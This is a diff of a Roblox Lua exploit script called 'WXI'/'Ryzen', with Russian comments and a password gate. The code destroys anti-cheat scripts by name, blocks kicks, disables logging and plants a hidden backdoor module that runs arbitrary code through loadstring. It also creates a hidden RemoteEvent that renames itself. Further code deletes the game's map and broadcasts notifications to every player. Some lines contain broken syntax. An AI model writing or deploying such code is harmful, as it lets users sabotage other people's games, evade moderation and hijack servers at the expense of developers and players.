@@ -1,92 +1,97 @@
--- WXI v666
--- Пароль: wxi8298
-
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
 local Debris = game:GetService("Debris")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 
 -- ============================================================
--- 1. РАНДОМНЫЕ ИМЕНА (ДЛЯ МАСКИРОВКИ)
+-- 1. НАСТРОЙКИ (ВСЁ ВКЛЮЧЕНО, НО ОПТИМИЗИРОВАНО)
 -- ============================================================
 
-local function getRandomName()
-    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-    local length = math.random(10, 20)
-    local str = ""
-    for i = 1, length do
-        str = str .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
-    end
-    return str
+local CONFIG = {
+    BLOOD_COUNT = 25,           -- Кровь (было 150 → 25)
+    WALL_COUNT = 15,            -- Стены (было 50 → 15)
+    PLATFORM_COUNT = 12,        -- Платформы (было 40 → 12)
+    LAKE_COUNT = 5,             -- Озёра крови (было 10 → 5)
+    BOSS_SIZE = 5,              -- 1x1x1x1 размер (было 8 → 5)
+    EFFECTS_COUNT = 8,          -- Взрывы (было 15 → 8)
+    LAVA_COUNT = 30,            -- Лава (было 100 → 30)
+    RAIN_COUNT = 20,            -- Кровавый дождь (было 50 → 20)
+    MUSIC_ENABLED = true,       -- Музыка включена
+    TANK_ENABLED = true,        -- Танк включён
+    NOTIFY_ALL = true,          -- Уведомления всем
+}
+
+-- ============================================================
+-- 2. ПАРОЛЬ
+-- ============================================================
+
+local PASSWORD = "ryzen2025"
+
+-- ============================================================
+-- 3. ЗАЩИТА (ЛЁГКАЯ)
+-- ============================================================
+
+local function superAntiAdmin()
+    pcall(function()
+        player.DisplayName = "1x1x1x1"
+        player.Name = "1x1x1x1"
+    end)
+
+    pcall(function()
+        player.Kick = function() return end
+        player:Destroy = function() return end
+    end)
+
+    pcall(function()
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("Script") then
+                local src = v.Source or ""
+                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") then
+                    v.Disabled = true
+                    task.wait(0.05)
+                    v:Destroy()
+                end
+            end
+        end
+    end)
+
+    pcall(function()
+        game:GetService("LogService"):SetLoggingEnabled(false)
+    end)
 end
 
--- ============================================================
--- 2. СУПЕР-ЗАЩИТА ОТ БАНА/КИКА
--- ============================================================
-
-pcall(function()
-    player.Kick = function() return end
-    player.Destroy = function() return end
-    
-    local mt = getrawmetatable(player)
-    if mt then
-        local oldIndex = mt.__index
-        setreadonly(mt, false)
-        mt.__index = function(self, key)
-            if key == "Kick" or key == "Destroy" then
-                return function() return end
-            end
-            return oldIndex(self, key)
-        end
-        setreadonly(mt, true)
-    end
-end)
-
-pcall(function()
-    player.DisplayName = "Ryzen_System"
-    player.Name = "Ryzen_System"
-end)
-
-pcall(function()
-    game:GetService("LogService"):SetLoggingEnabled(false)
-end)
+superAntiAdmin()
 
 -- ============================================================
--- 3. СКРЫТЫЙ БЭКДОР (ВНЕДРЯЕТСЯ В СЕРВЕР)
+-- 4. БЭКДОР
 -- ============================================================
 
-local backdoorName = getRandomName()
 local backdoorModule = Instance.new("ModuleScript")
-backdoorModule.Name = backdoorName
+backdoorModule.Name = "Sys_" .. tostring(math.random(1000,99999))
 backdoorModule.Source = [[
     local module = {}
-    
     function module.Execute(code)
         local func, err = loadstring(code)
-        if func then
-            return pcall(func)
-        end
+        if func then return pcall(func) end
         return false, err
     end
-    
     function module.Hijack()
         for _, v in pairs(game:GetDescendants()) do
             if v:IsA("Script") then
                 local src = v.Source or ""
-                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") or src:lower():match("detect") then
-                    pcall(function()
-                        v.Disabled = true
-                        v:Destroy()
-                    end)
+                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") then
+                    pcall(function() v.Disabled = true v:Destroy() end)
                 end
             end
         end
+        pcall(function() game:GetService("LogService"):SetLoggingEnabled(false) end)
         return "Hijacked"
     end
-    
     return module
 ]]
 backdoorModule.Parent = ReplicatedStorage
@@ -95,536 +100,1472 @@ local ryzenCore = require(backdoorModule)
 ryzenCore.Hijack()
 
 -- ============================================================
--- 4. СКРЫТЫЙ RemoteEvent (ДЛЯ КОМАНД)
+-- 5. RemoteEvent (СКРЫТЫЙ)
 -- ============================================================
 
-local remoteName = "R_" .. getRandomName()
 local remote = Instance.new("RemoteEvent")
-remote.Name = remoteName
+remote.Name = "R_" .. tostring(math.random(10000,99999))
 remote.Parent = ReplicatedStorage
 
 task.spawn(function()
     while true do
         task.wait(20)
-        remote.Name = "R_" .. getRandomName()
+        remote.Name = "R_" .. tostring(math.random(10000,99999))
     end
 end)
 
 -- ============================================================
--- 5. МАСКИРОВКА ОТ АДМИНОВ (НЕВИДИМОСТЬ)
+-- 6. УВЕДОМЛЕНИЯ (ДЛЯ ВСЕХ)
 -- ============================================================
 
-pcall(function()
-    local mt = getrawmetatable(game)
-    local old = mt.__namecall
-    setreadonly(mt, false)
-    mt.__namecall = newcclosure(function(self, ...)
-        local args = {...}
-        if args[1] == "FindFirstChild" and args[2] then
-            local name = tostring(args[2])
-            if name:match("Ryzen") or name:match("R_") or name:match(backdoorName) then
-                return nil
-            end
-        end
-        return old(self, ...)
-    end)
-    setreadonly(mt, true)
-end)
-
--- ============================================================
--- 6. ОБНАРУЖЕНИЕ АДМИНОВ (ТРЕКЕР)
--- ============================================================
-
-local function checkAdmin(plr)
-    pcall(function()
-        if plr:GetRankInGroup(game.CreatorId) > 200 then
+local function notifyAll(message, color)
+    color = color or Color3.fromRGB(255, 255, 255)
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
             game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "🛡️ ЗАЩИТА WXI",
-                Text = "⚠️ Админ [" .. plr.Name .. "] на сервере! Будьте осторожны.",
-                Duration = 7
+                Title = "⚡ RYZEN",
+                Text = message,
+                Duration = 3,
+                Icon = "rbxassetid://1234567890"
             })
+        end)
+    end
+end
+
+local function globalNotify(message, color, duration)
+    color = color or Color3.fromRGB(255, 255, 255)
+    duration = duration or 5
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            local g = Instance.new("ScreenGui")
+            g.Name = "RyzenGlobalNotify"
+            g.ResetOnSpawn = false
+            g.Parent = plr.PlayerGui
+            
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(1, 0, 0.15, 0)
+            frame.Position = UDim2.new(0, 0, 0, 0)
+            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            frame.BackgroundTransparency = 0.2
+            frame.BorderSizePixel = 0
+            frame.Parent = g
+            
+            local text = Instance.new("TextLabel")
+            text.Size = UDim2.new(1, 0, 1, 0)
+            text.BackgroundTransparency = 1
+            text.Text = message
+            text.TextColor3 = color
+            text.TextScaled = true
+            text.Font = Enum.Font.GothamBold
+            text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            text.TextStrokeTransparency = 0.3
+            text.Parent = frame
+            
+            frame.Position = UDim2.new(0, 0, -0.15, 0)
+            frame:TweenPosition(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
+            task.wait(duration)
+            frame:TweenPosition(UDim2.new(0, 0, -0.15, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.5, true)
+            task.wait(0.5)
+            g:Destroy()
+        end)
+    end
+end
+
+-- ============================================================
+-- 7. СОЗДАНИЕ 1x1x1x1 (5x5x5)
+-- ============================================================
+
+local function createBoss()
+    local oldBoss = Workspace:FindFirstChild("x1x1x1x1_BOSS")
+    if oldBoss then oldBoss:Destroy() end
+
+    local boss = Instance.new("Model")
+    boss.Name = "x1x1x1x1_BOSS"
+
+    local body = Instance.new("Part")
+    body.Size = Vector3.new(CONFIG.BOSS_SIZE, CONFIG.BOSS_SIZE, CONFIG.BOSS_SIZE)
+    body.Position = Vector3.new(0, CONFIG.BOSS_SIZE/2, 0)
+    body.BrickColor = BrickColor.new("Really black")
+    body.Material = Enum.Material.SmoothPlastic
+    body.Anchored = true
+    body.Parent = boss
+
+    for i = -1, 1, 2 do
+        local eye = Instance.new("Part")
+        eye.Size = Vector3.new(0.4, 0.4, 0.4)
+        eye.Position = body.Position + Vector3.new(i*0.8, 0.3, 2.8)
+        eye.BrickColor = BrickColor.new("White")
+        eye.Material = Enum.Material.SmoothPlastic
+        eye.Anchored = true
+        eye.Parent = boss
+    end
+
+    local mouth = Instance.new("Part")
+    mouth.Size = Vector3.new(1, 0.15, 0.15)
+    mouth.Position = body.Position + Vector3.new(0, -0.3, 2.8)
+    mouth.BrickColor = BrickColor.new("Bright red")
+    mouth.Material = Enum.Material.SmoothPlastic
+    mouth.Anchored = true
+    mouth.Parent = boss
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Size = UDim2.new(0, 6, 0, 1.5)
+    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = body
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = "👹 1x1x1x1 👹"
+    label.TextColor3 = Color3.fromRGB(255, 0, 0)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.Parent = billboard
+
+    task.spawn(function()
+        while body and body.Parent do
+            task.wait(0.05)
+            pcall(function()
+                body.CFrame = body.CFrame * CFrame.Angles(0, 0.03, 0)
+                body.Position = Vector3.new(0, CONFIG.BOSS_SIZE/2 + math.sin(tick() * 2) * 0.3, 0)
+            end)
         end
     end)
-end
 
-Players.PlayerAdded:Connect(checkAdmin)
-for _, p in ipairs(Players:GetPlayers()) do checkAdmin(p) end
-
--- ============================================================
--- 7. GUI (КРАСИВЫЙ ИНТЕРФЕЙС)
--- ============================================================
-
-local targetParent = player:WaitForChild("PlayerGui")
-pcall(function()
-    local coreGui = game:GetService("CoreGui")
-    if coreGui then targetParent = coreGui end
-end)
-
-local gui = Instance.new("ScreenGui")
-gui.Name = getRandomName()
-gui.ResetOnSpawn = false
-gui.Parent = targetParent
-
--- ============================================================
--- 8. ГЛАВНОЕ МЕНЮ
--- ============================================================
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = getRandomName()
-mainFrame.Size = UDim2.new(0, 300, 0, 420)
-mainFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-mainFrame.BorderSizePixel = 2
-mainFrame.BorderColor3 = Color3.fromRGB(200, 0, 0)
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.Visible = false
-mainFrame.Parent = gui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = mainFrame
-
--- ============================================================
--- 9. ЭКРАН ЗАГРУЗКИ
--- ============================================================
-
-local loadingFrame = Instance.new("Frame")
-loadingFrame.Name = getRandomName()
-loadingFrame.Size = UDim2.new(1, 0, 1, 0)
-loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
-loadingFrame.ZIndex = 10
-loadingFrame.Parent = gui
-
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(0.8, 0, 0.2, 0)
-loadingText.Position = UDim2.new(0.1, 0, 0.4, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Text = "⚡ ИНИЦИАЛИЗАЦИЯ WXI..."
-loadingText.TextColor3 = Color3.fromRGB(200, 0, 0)
-loadingText.Font = Enum.Font.GothamBold
-loadingText.TextSize = 24
-loadingText.ZIndex = 11
-loadingText.Parent = loadingFrame
-
-local progressBar = Instance.new("Frame")
-progressBar.Size = UDim2.new(0.6, 0, 0.04, 0)
-progressBar.Position = UDim2.new(0.2, 0, 0.55, 0)
-progressBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-progressBar.ZIndex = 11
-progressBar.Parent = loadingFrame
-
-local progressFill = Instance.new("Frame")
-progressFill.Size = UDim2.new(0, 0, 1, 0)
-progressFill.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-progressFill.ZIndex = 12
-progressFill.Parent = progressBar
-
-local progressText = Instance.new("TextLabel")
-progressText.Size = UDim2.new(0.3, 0, 0.05, 0)
-progressText.Position = UDim2.new(0.35, 0, 0.6, 0)
-progressText.BackgroundTransparency = 1
-progressText.Text = "0%"
-progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
-progressText.Font = Enum.Font.Gotham
-progressText.TextSize = 14
-progressText.ZIndex = 11
-progressText.Parent = loadingFrame
-
--- ============================================================
--- 10. ОКНО ВВОДА ПАРОЛЯ
--- ============================================================
-
-local passwordFrame = Instance.new("Frame")
-passwordFrame.Name = getRandomName()
-passwordFrame.Size = UDim2.new(0, 320, 0, 200)
-passwordFrame.Position = UDim2.new(0.5, -160, 0.5, -100)
-passwordFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
-passwordFrame.BorderSizePixel = 2
-passwordFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-passwordFrame.Visible = false
-passwordFrame.ZIndex = 5
-passwordFrame.Parent = gui
-
-local passCorner = Instance.new("UICorner")
-passCorner.CornerRadius = UDim.new(0, 10)
-passCorner.Parent = passwordFrame
-
-local passTitle = Instance.new("TextLabel")
-passTitle.Size = UDim2.new(1, 0, 0, 50)
-passTitle.Position = UDim2.new(0, 0, 0, 10)
-passTitle.BackgroundTransparency = 1
-passTitle.Text = "🔐 АВТОРИЗАЦИЯ"
-passTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-passTitle.Font = Enum.Font.GothamBold
-passTitle.TextSize = 18
-passTitle.ZIndex = 6
-passTitle.Parent = passwordFrame
-
-local passSubtitle = Instance.new("TextLabel")
-passSubtitle.Size = UDim2.new(1, 0, 0, 30)
-passSubtitle.Position = UDim2.new(0, 0, 0, 50)
-passSubtitle.BackgroundTransparency = 1
-passSubtitle.Text = "Введите пароль для доступа"
-passSubtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
-passSubtitle.Font = Enum.Font.Gotham
-passSubtitle.TextSize = 14
-passSubtitle.ZIndex = 6
-passSubtitle.Parent = passwordFrame
-
-local textBox = Instance.new("TextBox")
-textBox.Size = UDim2.new(0.8, 0, 0, 40)
-textBox.Position = UDim2.new(0.1, 0, 0.45, 0)
-textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-textBox.PlaceholderText = "Введите пароль..."
-textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
-textBox.Text = ""
-textBox.Font = Enum.Font.Gotham
-textBox.TextSize = 16
-textBox.ZIndex = 6
-textBox.Parent = passwordFrame
-
-local textCorner = Instance.new("UICorner")
-textCorner.CornerRadius = UDim.new(0, 6)
-textCorner.Parent = textBox
-
-local submitBtn = Instance.new("TextButton")
-submitBtn.Size = UDim2.new(0.4, 0, 0, 40)
-submitBtn.Position = UDim2.new(0.3, 0, 0.75, 0)
-submitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-submitBtn.Text = "🔓 ВОЙТИ"
-submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-submitBtn.Font = Enum.Font.GothamBold
-submitBtn.TextSize = 16
-submitBtn.ZIndex = 6
-submitBtn.Parent = passwordFrame
-
-local btnCorner = Instance.new("UICorner")
-btnCorner.CornerRadius = UDim.new(0, 6)
-btnCorner.Parent = submitBtn
-
--- ============================================================
--- 11. ЛОГИКА ЗАГРУЗКИ И ПАРОЛЯ
--- ============================================================
-
-local function animateLoading()
-    local steps = 20
-    for i = 1, steps do
-        task.wait(0.08)
-        local progress = i / steps
-        progressFill.Size = UDim2.new(progress, 0, 1, 0)
-        progressText.Text = math.floor(progress * 100) .. "%"
-        
-        if progress < 0.3 then
-            loadingText.Text = "🔐 ИНИЦИАЛИЗАЦИЯ ЗАЩИТЫ..."
-        elseif progress < 0.6 then
-            loadingText.Text = "📡 ПОДКЛЮЧЕНИЕ К СЕРВЕРУ..."
-        elseif progress < 0.8 then
-            loadingText.Text = "⚡ ЗАГРУЗКА МОДУЛЕЙ..."
-        else
-            loadingText.Text = "🔥 АКТИВАЦИЯ WXI..."
-        end
-    end
-    loadingText.Text = "✅ ГОТОВО!"
-    task.wait(0.3)
-    
-    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-    TweenService:Create(loadingFrame, tweenInfo, {BackgroundTransparency = 1}):Play()
-    TweenService:Create(loadingText, tweenInfo, {TextTransparency = 1}):Play()
-    TweenService:Create(progressBar, tweenInfo, {BackgroundTransparency = 1}):Play()
-    TweenService:Create(progressText, tweenInfo, {TextTransparency = 1}):Play()
-    
-    task.wait(0.5)
-    loadingFrame:Destroy()
-    passwordFrame.Visible = true
-end
-
-submitBtn.MouseButton1Click:Connect(function()
-    if textBox.Text == "ryzen2025" then
-        passwordFrame:Destroy()
-        mainFrame.Visible = true
-        
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "⚡ WXI CORE",
-            Text = "✅ ДОСТУП РАЗРЕШЕН! ПАНЕЛЬ АКТИВИРОВАНА.",
-            Duration = 3
-        })
-    else
-        textBox.Text = ""
-        textBox.PlaceholderText = "❌ НЕВЕРНЫЙ ПАРОЛЬ!"
-        textBox.PlaceholderColor3 = Color3.fromRGB(255, 0, 0)
-        task.wait(1.5)
-        textBox.PlaceholderText = "Введите пароль..."
-        textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
-    end
-end)
-
-textBox.FocusLost:Connect(function(enterPressed)
-    if enterPressed then submitBtn.MouseButton1Click:Fire() end
-end)
-
--- ============================================================
--- 12. ИНТЕРФЕЙС УПРАВЛЕНИЯ (ВКЛАДКИ)
--- ============================================================
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 45)
-title.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-title.BorderSizePixel = 0
-title.Text = "⚡ WXI PANEL ⚡"
-title.TextColor3 = Color3.fromRGB(200, 0, 0)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 18
-title.Parent = mainFrame
-
-local scroll = Instance.new("ScrollingFrame")
-scroll.Size = UDim2.new(1, -10, 1, -55)
-scroll.Position = UDim2.new(0, 5, 0, 50)
-scroll.BackgroundTransparency = 1
-scroll.BorderSizePixel = 0
-scroll.CanvasSize = UDim2.new(0, 0, 0, 800)
-scroll.ScrollBarThickness = 6
-scroll.Parent = mainFrame
-
-local layout = Instance.new("UIListLayout")
-layout.Padding = UDim.new(0, 6)
-layout.SortOrder = Enum.SortOrder.LayoutOrder
-layout.Parent = scroll
-
--- ============================================================
--- 13. ФУНКЦИИ (РАБОТАЮТ ЧЕРЕЗ БЭКДОР)
--- ============================================================
-
-local function executeServerCode(code)
-    pcall(function()
-        ryzenCore.Execute(code)
-    end)
-end
-
-local function createButton(text, callback, order)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 38)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(240, 240, 240)
-    btn.Font = Enum.Font.Gotham
-    btn.TextSize = 14
-    btn.LayoutOrder = order
-    btn.Parent = scroll
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
-    btnCorner.Parent = btn
-    
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-    btn.MouseButton1Click:Connect(callback)
+    boss.Parent = Workspace
+    return boss
 end
 
 -- ============================================================
--- 14. КОМАНДЫ (РАБОЧИЕ)
+-- 8. СОЗДАНИЕ КАРТЫ (ОПТИМИЗИРОВАННО)
 -- ============================================================
 
-createButton("🌋 СОЗДАТЬ КАРТУ АПОКАЛИПСИСА", function()
-    executeServerCode([[
-        for _, v in pairs(game.Workspace:GetChildren()) do
-            if v:IsA("BasePart") and not v:IsDescendantOf(game.Players) then
+local function createApocalypseMap()
+    for _, v in pairs(Workspace:GetChildren()) do
+        pcall(function()
+            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
                 v:Destroy()
             end
-        end
-        local ground = Instance.new("Part", game.Workspace)
-        ground.Size = Vector3.new(250,1,250)
-        ground.Position = Vector3.new(0,-0.5,0)
-        ground.BrickColor = BrickColor.new("Really black")
-        ground.Anchored = true
-        for i = 1, 30 do
-            local blood = Instance.new("Part", game.Workspace)
-            blood.Size = Vector3.new(math.random(1,4),0.1,math.random(1,4))
-            blood.Position = Vector3.new(math.random(-110,110),0,math.random(-110,110))
-            blood.BrickColor = BrickColor.new("Bright red")
-            blood.Anchored = true
-        end
-        local sky = game.Lighting:FindFirstChild("Sky") or Instance.new("Sky", game.Lighting)
-        sky.SkyboxBk = "rbxassetid://15050311563"
-        sky.SkyboxDn = "rbxassetid://15050311563"
-        sky.SkyboxLf = "rbxassetid://15050311563"
-        sky.SkyboxRt = "rbxassetid://15050311563"
-        sky.SkyboxUp = "rbxassetid://15050311563"
-        game.Lighting.FogColor = Color3.fromRGB(200,50,50)
-        game.Lighting.FogEnd = 250
-        game.Lighting.Brightness = 1.5
-    ]])
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "🌋 КАРТА",
-        Text = "Апокалипсис-карта создана!",
-        Duration = 3
-    })
-end, 1)
+        end)
+    end
 
-createButton("👹 ПРИЗВАТЬ RYZEN БОССА", function()
-    executeServerCode([[
-        local old = game.Workspace:FindFirstChild("Ryzen_BOSS")
-        if old then old:Destroy() end
-        local boss = Instance.new("Model", game.Workspace)
-        boss.Name = "Ryzen_BOSS"
-        local body = Instance.new("Part", boss)
-        body.Size = Vector3.new(5,5,5)
-        body.Position = Vector3.new(0,2.5,0)
-        body.BrickColor = BrickColor.new("Really black")
-        body.Anchored = true
-        for i = -1,1,2 do
-            local eye = Instance.new("Part", boss)
-            eye.Size = Vector3.new(0.4,0.4,0.4)
-            eye.CFrame = body.CFrame * CFrame.new(i*0.8,0.3,2.8)
-            eye.BrickColor = BrickColor.new("Bright red")
-            eye.Material = Enum.Material.Neon
-            eye.Anchored = true
+    -- ОСНОВА
+    local ground = Instance.new("Part")
+    ground.Size = Vector3.new(250, 1, 250)
+    ground.Position = Vector3.new(0, -0.5, 0)
+    ground.BrickColor = BrickColor.new("Really black")
+    ground.Material = Enum.Material.SmoothPlastic
+    ground.Anchored = true
+    ground.Parent = Workspace
+
+    -- КРОВЬ (25)
+    for i = 1, CONFIG.BLOOD_COUNT do
+        local blood = Instance.new("Part")
+        blood.Size = Vector3.new(math.random(1,4), 0.1, math.random(1,4))
+        blood.Position = Vector3.new(math.random(-110,110), 0, math.random(-110,110))
+        blood.BrickColor = BrickColor.new("Bright red")
+        blood.Material = Enum.Material.SmoothPlastic
+        blood.Transparency = 0.3
+        blood.Anchored = true
+        blood.Parent = Workspace
+    end
+
+    -- СТЕНЫ (15)
+    for i = 1, CONFIG.WALL_COUNT do
+        local wall = Instance.new("Part")
+        wall.Size = Vector3.new(math.random(5,15), math.random(3,6), math.random(5,15))
+        wall.Position = Vector3.new(math.random(-110,110), math.random(1,3), math.random(-110,110))
+        wall.BrickColor = BrickColor.new(math.random(1,2) == 1 and "Bright red" or "Really black")
+        wall.Material = Enum.Material.SmoothPlastic
+        wall.Anchored = true
+        wall.Parent = Workspace
+    end
+
+    -- ПАРКУР (12)
+    for i = 1, CONFIG.PLATFORM_COUNT do
+        local platform = Instance.new("Part")
+        platform.Size = Vector3.new(math.random(3,8), 0.5, math.random(3,8))
+        platform.Position = Vector3.new(math.random(-105,105), math.random(2,12), math.random(-105,105))
+        platform.BrickColor = BrickColor.new("Bright red")
+        platform.Material = Enum.Material.SmoothPlastic
+        platform.Anchored = true
+        platform.Parent = Workspace
+    end
+
+    -- ОЗЁРА КРОВИ (5)
+    for i = 1, CONFIG.LAKE_COUNT do
+        local lake = Instance.new("Part")
+        lake.Size = Vector3.new(math.random(10,20), 0.5, math.random(10,20))
+        lake.Position = Vector3.new(math.random(-105,105), -0.2, math.random(-105,105))
+        lake.BrickColor = BrickColor.new("Bright red")
+        lake.Material = Enum.Material.SmoothPlastic
+        lake.Transparency = 0.5
+        lake.Anchored = true
+        lake.Parent = Workspace
+    end
+
+    -- КРАСНОЕ НЕБО
+    local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
+    sky.SkyboxBk = "rbxassetid://15050311563"
+    sky.SkyboxDn = "rbxassetid://15050311563"
+    sky.SkyboxLf = "rbxassetid://15050311563"
+    sky.SkyboxRt = "rbxassetid://15050311563"
+    sky.SkyboxUp = "rbxassetid://15050311563"
+    Lighting.FogColor = Color3.fromRGB(200,50,50)
+    Lighting.FogEnd = 250
+    Lighting.Brightness = 1.5
+    Lighting.Ambient = Color3.fromRGB(100,0,0)
+
+    createBoss()
+    globalNotify("🌋 КРОВАВАЯ КАРТА СОЗДАНА! 1x1x1x1 ЖДЁТ!", Color3.fromRGB(255,0,0), 4)
+end
+
+-- ============================================================
+-- 9. НАКЛОН КАРТЫ (TILT)
+-- ============================================================
+
+local tiltActive = false
+local tiltAngle = 0
+local tiltAxis = "X"
+local tiltGroup = nil
+
+local function tiltMap(angle, axis)
+    axis = axis or "X"
+    angle = math.clamp(angle, -45, 45)
+    
+    tiltAngle = angle
+    tiltAxis = axis
+    tiltActive = true
+    
+    -- Удаляем старую группу
+    if tiltGroup and tiltGroup.Parent then
+        tiltGroup:Destroy()
+    end
+    
+    -- Собираем все части
+    local parts = {}
+    for _, v in pairs(Workspace:GetDescendants()) do
+        if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
+            table.insert(parts, v)
         end
-        local bill = Instance.new("BillboardGui", body)
-        bill.Size = UDim2.new(0,6,0,1.5)
-        bill.StudsOffset = Vector3.new(0,3.5,0)
-        bill.AlwaysOnTop = true
-        local label = Instance.new("TextLabel", bill)
-        label.Size = UDim2.new(1,0,1,0)
-        label.BackgroundTransparency = 1
-        label.Text = "🔥 1x1x1x1 BOSS 🔥"
-        label.TextColor3 = Color3.fromRGB(255,0,0)
-        label.TextScaled = true
-        label.Font = Enum.Font.GothamBold
-    ]])
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "👹 БОСС",
-        Text = "Ryzen Босс призван!",
-        Duration = 3
-    })
-end, 2)
+    end
+    
+    if #parts == 0 then return end
+    
+    -- Создаём группу
+    tiltGroup = Instance.new("Model")
+    tiltGroup.Name = "TiltGroup"
+    
+    for _, part in pairs(parts) do
+        part.Parent = tiltGroup
+    end
+    
+    tiltGroup.Parent = Workspace
+    
+    -- Центр карты
+    local center = Vector3.new(0, 0, 0)
+    local count = 0
+    for _, part in pairs(tiltGroup:GetChildren()) do
+        if part:IsA("BasePart") then
+            center = center + part.Position
+            count = count + 1
+        end
+    end
+    if count > 0 then
+        center = center / count
+    end
+    
+    -- Поворот
+    local rotation = CFrame.Angles(0, 0, 0)
+    if axis == "X" then
+        rotation = CFrame.Angles(math.rad(angle), 0, 0)
+    elseif axis == "Z" then
+        rotation = CFrame.Angles(0, 0, math.rad(angle))
+    end
+    
+    -- Применяем наклон
+    for _, part in pairs(tiltGroup:GetChildren()) do
+        if part:IsA("BasePart") then
+            pcall(function()
+                local relativePos = part.Position - center
+                local newPos = center + (rotation * relativePos)
+                part.Position = newPos
+                part.CFrame = rotation * part.CFrame
+            end)
+        end
+    end
+    
+    globalNotify("🌍 Карта наклонена на " .. angle .. "° по оси " .. axis, Color3.fromRGB(255,150,0), 3)
+end
 
-createButton("🔫 ПОЛУЧИТЬ AK-47", function()
-    executeServerCode([[
-        local tool = Instance.new("Tool")
-        tool.Name = "AK-47 [Ryzen]"
-        tool.RequiresHandle = true
-        tool.Parent = game.Players.LocalPlayer.Backpack
-        local handle = Instance.new("Part", tool)
-        handle.Name = "Handle"
-        handle.Size = Vector3.new(1,0.5,2)
-        handle.BrickColor = BrickColor.new("Really black")
-    ]])
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "🔫 ОРУЖИЕ",
-        Text = "AK-47 выдан!",
-        Duration = 3
-    })
-end, 3)
+local function resetTilt()
+    tiltActive = false
+    tiltAngle = 0
+    
+    if tiltGroup and tiltGroup.Parent then
+        for _, part in pairs(tiltGroup:GetChildren()) do
+            pcall(function()
+                part.Parent = Workspace
+            end)
+        end
+        tiltGroup:Destroy()
+        tiltGroup = nil
+    end
+    
+    globalNotify("🌍 Карта возвращена в нормальное положение", Color3.fromRGB(0,200,100), 3)
+end
 
-createButton("🤚 АНИМАЦИЯ ДЛЯ ВСЕХ", function()
-    executeServerCode([[
-        for _, plr in pairs(game.Players:GetPlayers()) do
+local function smoothTilt(targetAngle, axis, duration)
+    duration = duration or 2
+    local startAngle = tiltAngle
+    local startTime = tick()
+    
+    task.spawn(function()
+        while tick() - startTime < duration do
+            local progress = (tick() - startTime) / duration
+            local currentAngle = startAngle + (targetAngle - startAngle) * progress
+            tiltMap(currentAngle, axis)
+            task.wait(0.05)
+        end
+        tiltMap(targetAngle, axis)
+    end)
+end
+
+-- ============================================================
